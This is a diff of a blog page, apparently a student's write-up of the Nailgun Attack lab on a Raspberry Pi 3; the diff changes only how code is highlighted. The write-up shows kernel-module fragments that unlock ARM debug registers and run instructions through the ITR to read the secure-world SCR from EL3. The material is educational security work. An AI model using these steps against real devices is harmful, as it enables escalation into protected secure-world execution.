@@ -17,14 +17,14 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"www.sky-learner.top","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":true,"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"twikoo","storage":true,"lazyload":false,"nav":null,"activeClass":"twikoo"},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto","highlight":false}}</script><script src="/js/config.js" defer></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.sky-learner.top","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":false,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism-vsc-dark-plus","dark":"prism-vsc-dark-plus"},"copy_button":{"enable":true,"style":"flat","show_result":true},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"twikoo","storage":true,"lazyload":false,"nav":null,"activeClass":"twikoo"},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto","highlight":false}}</script><script src="/js/config.js" defer></script>
 
-    <meta name="description" content="Task 1: Create and Install a Kernel Module simple_module.c 123456789101112131415161718192021&#x2F;* simple_module.c *&#x2F;#include &lt;linux&#x2F;module.h&gt;#include &lt;linux&#x2F;kernel.h&gt;#include &lt;linux&#x2F;init.h">
+    <meta name="description" content="Task 1: Create and Install a Kernel Module simple_module.c &#x2F;* simple_module.c *&#x2F; #include &lt;linux&#x2F;module.h&gt; #include &lt;linux&#x2F;kernel.h&gt; #include &lt;linux&#x2F;init.h&gt; #include &lt;asm&#x2F;io.h&gt;  static int">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Nailgun Attack Lab Analysis">
 <meta property="og:url" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/index.html">
 <meta property="og:site_name" content="My Blog">
-<meta property="og:description" content="Task 1: Create and Install a Kernel Module simple_module.c 123456789101112131415161718192021&#x2F;* simple_module.c *&#x2F;#include &lt;linux&#x2F;module.h&gt;#include &lt;linux&#x2F;kernel.h&gt;#include &lt;linux&#x2F;init.h">
+<meta property="og:description" content="Task 1: Create and Install a Kernel Module simple_module.c &#x2F;* simple_module.c *&#x2F; #include &lt;linux&#x2F;module.h&gt; #include &lt;linux&#x2F;kernel.h&gt; #include &lt;linux&#x2F;init.h&gt; #include &lt;asm&#x2F;io.h&gt;  static int">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/t1_2.png">
 <meta property="og:image" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/t1.png">
@@ -327,7 +327,7 @@ and Exit</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" hre
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>6.5k</span>
+      <span>6.2k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -347,10 +347,37 @@ and Exit</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" hre
     <div class="post-body" itemprop="articleBody"><h5 id="task-1-create-and-install-a-kernel-module">Task 1: Create and
 Install a Kernel Module</h5>
 <p>simple_module.c</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* simple_module.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">simple_module_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        printk(<span class="string">&quot;Helloworld.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *The cleanup function of the module.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">simple_module_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        printk(KERN_INFO<span class="string">&quot;Exit.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(simple_module_init);</span><br><span class="line">module_exit(simple_module_exit);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* simple_module.c */</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/kernel.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/init.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;asm/io.h></span></span>
+
+<span class="token keyword">static</span> <span class="token keyword">int</span> __init <span class="token function">simple_module_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+        <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"Helloworld.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token comment">/*
+ *The cleanup function of the module.
+ */</span>
+<span class="token keyword">static</span> <span class="token keyword">void</span> __exit <span class="token function">simple_module_exit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+        <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO<span class="token string">"Exit.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token function">module_init</span><span class="token punctuation">(</span>simple_module_init<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">module_exit</span><span class="token punctuation">(</span>simple_module_exit<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <span id="more"></span>
 <p>Makefile</p>
-<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">obj-m += simple_module.o</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">        make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">        make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> clean</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">obj-m <span class="token operator">+=</span> simple_module.o
+
+<span class="token target symbol">all</span><span class="token punctuation">:</span>
+        make -C /lib/modules/<span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> uname -r<span class="token punctuation">)</span>/build M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span>PWD<span class="token punctuation">)</span> modules
+
+<span class="token target symbol">clean</span><span class="token punctuation">:</span>
+        make -C /lib/modules/<span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> uname -r<span class="token punctuation">)</span>/build M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span>PWD<span class="token punctuation">)</span> clean
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t1_2.png" /></p>
 <p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t1.png" /></p>
 <blockquote>
@@ -363,13 +390,21 @@ is loaded.</p>
 <h5 id="task-2-directly-access-a-high-privilege-register-scr">Task 2:
 Directly Access a High Privilege Register: SCR</h5>
 <p><img src="accessing_scr_aarch32.png" /></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* simple_module.c */</span></span><br><span class="line">...</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">simple_module_init</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">        <span class="type">uint32_t</span> reg;</span><br><span class="line">        <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;mrc p15, 0, %0, c1, c1, 0&quot;</span>:<span class="string">&quot;=r&quot;</span>(reg))</span>;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;SCR %x.\n&quot;</span>, reg);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* simple_module.c */</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token keyword">static</span> <span class="token keyword">int</span> __init <span class="token function">simple_module_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token class-name">uint32_t</span> reg<span class="token punctuation">;</span>
+        <span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mrc p15, 0, %0, c1, c1, 0"</span><span class="token operator">:</span><span class="token string">"=r"</span><span class="token punctuation">(</span>reg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"SCR %x.\n"</span><span class="token punctuation">,</span> reg<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <blockquote>
 <p>Task 2.a : What is the complete instruction? Look up the manual and
 fill the instruction bellow. Then compile and execute.</p>
 </blockquote>
 <p>complete instruction:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mrc p15, 0, &lt;Rt&gt;, c1, c1, 0</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mrc p15, 0, &lt;Rt&gt;, c1, c1, 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>compile</p>
 <p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t2_1.png" /></p>
 <p>try to install this kernel module</p>
@@ -382,7 +417,7 @@ fill the instruction bellow. Then compile and execute.</p>
 privileged instruction that is not allowed in the current processor
 mode.</p>
 <p>Specifically, the inline assembly instruction</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mrc p15, 0, &lt;Rt&gt;, c1, c1, 0</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mrc p15, 0, &lt;Rt&gt;, c1, c1, 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>tries to access the Secure Configuration Register (SCR), which
 belongs to the <strong>secure world</strong>.</p>
 <p>However, the Linux kernel runs in the <strong>non-secure world at
@@ -394,9 +429,33 @@ Debug Authentication Signal</h5>
 <blockquote>
 <p>Task 3.a: What is the instruction to read DBGAUTHSTATUS?</p>
 </blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mrc p14, 0, &lt;Rt&gt;, c7, c14, 6</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mrc p14, 0, &lt;Rt&gt;, c7, c14, 6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>dbgauth_module.c</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* dbgauth_module.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">dbgauth_init</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">        <span class="type">uint32_t</span> reg;</span><br><span class="line">        printk(KERN_INFO<span class="string">&quot;dbgauth_module: init - attempt to read DBGAUTHSTATUS\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 读取 DBGAUTHSTATUS:</span></span><br><span class="line"><span class="comment">         * MRC p14, 0, &lt;Rt&gt;, c7, c14, 6</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;mrc p14, 0, %0, c7, c14, 6&quot;</span> : <span class="string">&quot;=r&quot;</span>(reg))</span>;</span><br><span class="line">        printk(KERN_INFO<span class="string">&quot;dbgauth_module: DBGAUTHSTATUS = 0x%08x\n&quot;</span>, reg);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">dbgauth_exit</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;dbgauth_module: exit\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(dbgauth_init);</span><br><span class="line">module_exit(dbgauth_exit);</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* dbgauth_module.c */</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/kernel.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/init.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;asm/io.h></span></span>
+
+<span class="token keyword">static</span> <span class="token keyword">int</span> __init <span class="token function">dbgauth_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token class-name">uint32_t</span> reg<span class="token punctuation">;</span>
+        <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO<span class="token string">"dbgauth_module: init - attempt to read DBGAUTHSTATUS\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">/* 读取 DBGAUTHSTATUS:
+         * MRC p14, 0, &lt;Rt>, c7, c14, 6
+         */</span>
+        <span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mrc p14, 0, %0, c7, c14, 6"</span> <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>reg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO<span class="token string">"dbgauth_module: DBGAUTHSTATUS = 0x%08x\n"</span><span class="token punctuation">,</span> reg<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        
+        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">static</span> <span class="token keyword">void</span> __exit <span class="token function">dbgauth_exit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"dbgauth_module: exit\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token function">module_init</span><span class="token punctuation">(</span>dbgauth_init<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">module_exit</span><span class="token punctuation">(</span>dbgauth_exit<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>We can get DBGAUTHSTATUS after installing this kernel module</p>
 <p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t3_2.png" /></p>
 <blockquote>
@@ -444,18 +503,20 @@ Debug</h5>
 <p>We can find that <code>EDLAR_OFFSET=0xFB0</code></p>
 <p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t4_3.png" /></p>
 <p>Write the key value to unlock</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iowrite32(<span class="number">0xC5ACCE55</span>, param-&gt;debug_register + EDLAR_OFFSET);</span><br><span class="line">iowrite32(<span class="number">0xC5ACCE55</span>, param-&gt;cti_register + EDLAR_OFFSET);</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">iowrite32</span><span class="token punctuation">(</span><span class="token number">0xC5ACCE55</span><span class="token punctuation">,</span> param<span class="token operator">-></span>debug_register <span class="token operator">+</span> EDLAR_OFFSET<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">iowrite32</span><span class="token punctuation">(</span><span class="token number">0xC5ACCE55</span><span class="token punctuation">,</span> param<span class="token operator">-></span>cti_register <span class="token operator">+</span> EDLAR_OFFSET<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t4_2.png" /></p>
 <p>We can find that <code>OSLAR_OFFSET=0x300</code></p>
 <p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t4_4.png" /></p>
 <p>Writing 0 to the <code>OSLK</code> bit unlocks the OS,</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iowrite32(<span class="number">0</span>, param-&gt;debug_register + OSLAR_OFFSET);</span><br><span class="line">iowrite32(<span class="number">0</span>, param-&gt;cti_register + OSLAR_OFFSET);</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">iowrite32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> param<span class="token operator">-></span>debug_register <span class="token operator">+</span> OSLAR_OFFSET<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">iowrite32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> param<span class="token operator">-></span>cti_register <span class="token operator">+</span> OSLAR_OFFSET<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h5 id="task-5-switch-to-the-el3-and-read-the-scr">Task 5: Switch to the
 EL3 and read the SCR</h5>
 <p>​ Task5.a: We mention how to access SCR directly in Task2. You need to
 prepare an instruction, who reads SCR and store it to R1. Then convert
 it to machine code(do it on yourself) and execute it on the target.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mrc p15,0,R1,c1,c1,0</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mrc p15,0,R1,c1,c1,0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>use <a
 target="_blank" rel="noopener" href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/">Online
 Assembler and Disassembler</a> to assemble this instruction. It yields
@@ -468,7 +529,8 @@ halfword of the T32 instruction. They are displayed in a nonstandard
 order (hw2 on the left, hw1 on the right).</p>
 </blockquote>
 <p>In terms of a 32-bit value for C code execution:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0xee111f11 &lt;=&gt; mrc p15,0,R1,c1,c1,0</span></span><br><span class="line">execute_ins_via_itr(param-&gt;debug_register, <span class="number">0x1f11ee11</span>);</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 0xee111f11 &lt;=> mrc p15,0,R1,c1,c1,0</span>
+<span class="token function">execute_ins_via_itr</span><span class="token punctuation">(</span>param<span class="token operator">-></span>debug_register<span class="token punctuation">,</span> <span class="token number">0x1f11ee11</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>​ Task 5.b: After you finish Task 5.a , you need to transfer the value
 in R1 on core0, to the local variable scr. It will be printed later.
 DBGDTRTXint and DBGDTRTX would be helpful in your implementation</p>
@@ -477,12 +539,13 @@ DBGDTRTXint and DBGDTRTX would be helpful in your implementation</p>
 <p><strong>DBGDTRTXint</strong> is a 32-bit debug register that allows
 the processor to transfer data to an external debugger. It is accessed
 using the <strong>MCR instruction</strong>, for example:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MCR p14, 0, Rt, c0, c5, 0</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">MCR p14, 0, Rt, c0, c5, 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>In terms of a 32-bit value for C code execution:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ee001e15 &lt;=&gt; mcr p14,0,R1,c0,c5,0</span></span><br><span class="line">execute_ins_via_itr(param-&gt;debug_register, <span class="number">0x1e15ee00</span>);</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// ee001e15 &lt;=> mcr p14,0,R1,c0,c5,0</span>
+<span class="token function">execute_ins_via_itr</span><span class="token punctuation">(</span>param<span class="token operator">-></span>debug_register<span class="token punctuation">,</span> <span class="token number">0x1e15ee00</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>Register DBGDTRTXint bits [31:0] are architecturally mapped to
 DBGDTRTX_EL0[31:0].</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scr = ioread32(param-&gt;debug_register + DBGDTRTX_OFFSET);</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">scr <span class="token operator">=</span> <span class="token function">ioread32</span><span class="token punctuation">(</span>param<span class="token operator">-></span>debug_register <span class="token operator">+</span> DBGDTRTX_OFFSET<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h5 id="task-6-restore-the-context-and-exit">Task 6: Restore the Context
 and Exit</h5>
 <p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t6.png" /></p>
@@ -503,7 +566,8 @@ PSTATE.A. When PSTATE.A is 0, the abort is taken to EL3.</p></li>
 in Raspberry Pi 3? Can your find the global address of CTICONTROL
 register in Raspberry Pi 3 according to the Arm Reference Manual? Answer
 the address value and show your calculation. (hint: Find the offset)</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0x40038000 is the base address of the cross trigger interface registers on Core 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CTI_REGISTER_ADDR 0x40038000</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 0x40038000 is the base address of the cross trigger interface registers on Core 0</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CTI_REGISTER_ADDR</span> <span class="token expression"><span class="token number">0x40038000</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/q1.png" /></p>
 <p>The global address of the <strong>CTICONTROL</strong> register is
 calculated as:</p>
@@ -521,12 +585,28 @@ memory mapping? If yes, how to do that? Justify your answer.</p>
 <p>Extract Step 1 (the part that unlocks debug and cross-trigger
 registers) from the <code>read_scr()</code> function, and modify it so
 that instead of unlocking the OS Lock, it <strong>locks</strong> it.</p>
